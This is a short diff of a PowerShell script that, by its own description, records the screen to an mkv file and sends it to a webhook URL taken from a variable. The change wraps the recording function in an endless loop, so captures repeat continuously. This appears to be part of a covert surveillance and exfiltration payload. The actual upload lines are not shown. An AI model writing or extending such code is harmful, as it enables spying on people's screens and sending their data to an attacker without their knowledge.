@@ -8,6 +8,8 @@ This script records the screen for a specified time to a mkv file, then sends th
 $hookurl = "$dc"
 if ($hookurl.Ln -lt 120){$hookurl = (irm $hookurl).url}
 
+while($true){
+
 Function RecordScreen{
     param ([int[]]$t)
     if ($t.Length -eq 0){$t = 10}
@@ -35,3 +37,5 @@ Function RecordScreen{
 }
 
 RecordScreen
+
+}
